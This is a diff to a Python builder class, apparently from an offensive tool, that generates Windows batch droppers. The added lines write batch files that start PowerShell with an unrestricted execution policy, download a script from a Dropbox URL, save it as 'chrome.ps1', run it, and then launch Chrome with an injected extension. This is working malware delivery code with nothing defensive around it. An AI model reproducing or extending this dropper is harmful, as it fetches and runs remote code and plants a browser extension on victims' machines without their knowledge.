@@ -25,7 +25,7 @@ class Build :
 				payloads = "data/payloads/VBScript/vbs.txt" # Payload file
 
 			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file
-			powershell = "{}.{}".format("chrome", "ps1") # Make .bat file
+			powershell = "{}.{}".format("powershell", "ps1") # Make .bat file
 
 			if not os.path.exists("output/builds/{}".format(build)):
 				print("{} First upload the files to get shared links".format(self.color.yellows("[!]")))
@@ -44,7 +44,7 @@ class Build :
 
 						with open(os.path.join(path, build), 'a') as builder :
 							# Write the new file
-							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
+							batch = '@echo off\n PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile("https://www.dropbox.com/s/kemwvd6nqkgbpvv/eeoekjnjgppnaegdjbcafdggilajhpic.ps1?dl=1","chrome.ps1"); ./chrome.ps1;\n PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\\bpoenohoghmegkhgcldihgeebdnechlk\necho\nPAUSE'
 							batch = batch.replace('******', "******")
 							builder.write(batch)
 						builder.close()
@@ -75,7 +75,8 @@ class Build :
 
 						with open(os.path.join(path, build), 'w') as builder :
 							# Write the new file
-							batch = "@ECHO OFF PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command (new-object net.webclient).DownloadFile('******','chrome.ps1'); ./chrome.ps1 PAUSE"
+							batch = '@echo off\n PowerShell.exe -ExecutionPolicy UnRestricted -nop -c "(new-object net.webclient).DownloadFile("https://www.dropbox.com/s/kemwvd6nqkgbpvv/eeoekjnjgppnaegdjbcafdggilajhpic.ps1?dl=1","chrome.ps1"); ./chrome.ps1;\n PowerShell.exe & "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension=C:\chrome\output\extensions\extensionid\necho\nPAUSE'
+							batch = batch.replace('extensionid', self.extension)
 							batch = batch.replace('******', paths[1])
 							builder.write(batch)
 						builder.close()
